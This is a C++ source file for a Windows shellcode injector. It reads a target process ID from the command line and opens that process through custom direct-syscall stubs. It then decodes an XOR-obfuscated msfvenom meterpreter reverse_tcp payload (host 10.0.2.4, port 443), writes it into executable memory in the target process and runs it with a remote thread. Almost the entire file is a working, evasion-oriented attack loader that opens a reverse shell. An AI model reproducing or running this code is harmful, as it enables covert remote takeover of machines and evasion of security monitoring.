#include <iostream>
#include <string>
#include <Windows.h>
#pragma comment(lib, "ntdll")

#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;


EXTERN_C NTSTATUS myNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
EXTERN_C NTSTATUS myNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
EXTERN_C NTSTATUS myNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
EXTERN_C NTSTATUS myNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
EXTERN_C NTSTATUS myNtWaitForSingleObject(HANDLE ProcessHandle, BOOL Alertable, PLARGE_INTEGER Timeout);


// XOR-encoded payload.
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=443 EXITFUNC=thread -f csharp
unsigned char buf[] = "\x06\xb2\x79\x1e\x0a\x12\x36\xfa\xfa\xfa\xbb\xab\xbb\xaa\xa8\xab\xac\xb2\xcb\x28\x9f\xb2\x71\xa8\x9a\xb2\x71\xa8\xe2\xb2\x71\xa8\xda\xb2\xf5\x4d\xb0\xb0\xb7\xcb\x33\xb2\x71\x88\xaa\xb2\xcb\x3a\x56\xc6\x9b\x86\xf8\xd6\xda\xbb\x3b\x33\xf7\xbb\xfb\x3b\x18\x17\xa8\xb2\x71\xa8\xda\x71\xb8\xc6\xbb\xab\xb2\xfb\x2a\x9c\x7b\x82\xe2\xf1\xf8\xf5\x7f\x88\xfa\xfa\xfa\x71\x7a\x72\xfa\xfa\xfa\xb2\x7f\x3a\x8e\x9d\xb2\xfb\x2a\xbe\x71\xba\xda\xb3\xfb\x2a\xaa\x71\xb2\xe2\x19\xac\xb7\xcb\x33\xb2\x05\x33\xbb\x71\xce\x72\xb2\xfb\x2c\xb2\xcb\x3a\x56\xbb\x3b\x33\xf7\xbb\xfb\x3b\xc2\x1a\x8f\x0b\xb6\xf9\xb6\xde\xf2\xbf\xc3\x2b\x8f\x22\xa2\xbe\x71\xba\xde\xb3\xfb\x2a\x9c\xbb\x71\xf6\xb2\xbe\x71\xba\xe6\xb3\xfb\x2a\xbb\x71\xfe\x72\xb2\xfb\x2a\xbb\xa2\xbb\xa2\xa4\xa3\xa0\xbb\xa2\xbb\xa3\xbb\xa0\xb2\x79\x16\xda\xbb\xa8\x05\x1a\xa2\xbb\xa3\xa0\xb2\x71\xe8\x13\xb1\x05\x05\x05\xa7\xb3\x44\x8d\x89\xc8\xa5\xc9\xc8\xfa\xfa\xbb\xac\xb3\x73\x1c\xb2\x7b\x16\x5a\xfb\xfa\xfa\xb3\x73\x1f\xb3\x46\xf8\xfa\xfb\x41\xf0\xfa\xf8\xfe\xbb\xae\xb3\x73\x1e\xb6\x73\x0b\xbb\x40\xb6\x8d\xdc\xfd\x05\x2f\xb6\x73\x10\x92\xfb\xfb\xfa\xfa\xa3\xbb\x40\xd3\x7a\x91\xfa\x05\x2f\x90\xf0\xbb\xa4\xaa\xaa\xb7\xcb\x33\xb7\xcb\x3a\xb2\x05\x3a\xb2\x73\x38\xb2\x05\x3a\xb2\x73\x3b\xbb\x40\x10\xf5\x25\x1a\x05\x2f\xb2\x73\x3d\x90\xea\xbb\xa2\xb6\x73\x18\xb2\x73\x03\xbb\x40\x63\x5f\x8e\x9b\x05\x2f\x7f\x3a\x8e\xf0\xb3\x05\x34\x8f\x1f\x12\x69\xfa\xfa\xfa\xb2\x79\x16\xea\xb2\x73\x18\xb7\xcb\x33\x90\xfe\xbb\xa2\xb2\x73\x03\xbb\x40\xf8\x23\x32\xa5\x05\x2f\x79\x02\xfa\x84\xaf\xb2\x79\x3e\xda\xa4\x73\x0c\x90\xba\xbb\xa3\x92\xfa\xea\xfa\xfa\xbb\xa2\xb2\x73\x08\xb2\xcb\x33\xbb\x40\xa2\x5e\xa9\x1f\x05\x2f\xb2\x73\x39\xb3\x73\x3d\xb7\xcb\x33\xb3\x73\x0a\xb2\x73\x20\xb2\x73\x03\xbb\x40\xf8\x23\x32\xa5\x05\x2f\x79\x02\xfa\x87\xd2\xa2\xbb\xad\xa3\x92\xfa\xba\xfa\xfa\xbb\xa2\x90\xfa\xa0\xbb\x40\xf1\xd5\xf5\xca\x05\x2f\xad\xa3\xbb\x40\x8f\x94\xb7\x9b\x05\x2f\xb3\x05\x34\x13\xc6\x05\x05\x05\xb2\xfb\x39\xb2\xd3\x3c\xb2\x7f\x0c\x8f\x4e\xbb\x05\x1d\xa2\x90\xfa\xa3\x41\x1a\xe7\xd0\xf0\xbb\x73\x20\x05\x2f";

int main(int argc, char* argv[])
{
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid;
    DWORD pid = std::stoi(argv[1]);
    cid.UniqueProcess = (PVOID)pid;
    cid.UniqueThread = 0;
    size_t bufSize = sizeof(buf);

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID bufAdd = nullptr;
    ULONG bytesWritten;

    printf("Pening handle\n");
    // Open handle to the target process
    myNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    std::cout << "hProcess: " << hProcess << std::endl;

    printf("Allocating memory\n");
    // Allocate virtual memory in the target process 
    //bufAdd = VirtualAllocEx(hProcess, NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    myNtAllocateVirtualMemory(hProcess, &bufAdd, 0, &bufSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_EXECUTE_READWRITE);
    std::cout << "Base address: " << bufAdd << std::endl;
    std::cout << "Size: " << bufSize << std::endl;

    // XOR the buffer with 0xfa
    // sizeof(buf) - 1; // Exclude the null terminator
    for (size_t i = 0; i < sizeof(buf) - 1; i++) {
        buf[i] ^= 0xfa;
    }

    printf("Writing memory\n");
    // copy shellcode to the local view, which will get reflected in the target process's mapped view
    //WriteProcessMemory(hProcess, bufAdd, (PVOID)buf, bufSize - 1, (SIZE_T*)NULL);
    myNtWriteVirtualMemory(hProcess, bufAdd, (PVOID)buf, sizeof(buf), &bytesWritten);
    std::cout << "Bytes written: " << bytesWritten << std::endl;



    printf("Creating thread\n");
    // Create a thread
    //hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bufAdd, NULL, 0, NULL);
    myNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)bufAdd, NULL, FALSE, 0, 0, 0, NULL);
    std::cout << "hThread: " << hThread << std::endl;

    myNtWaitForSingleObject(hThread, FALSE, NULL);
    return 0;
}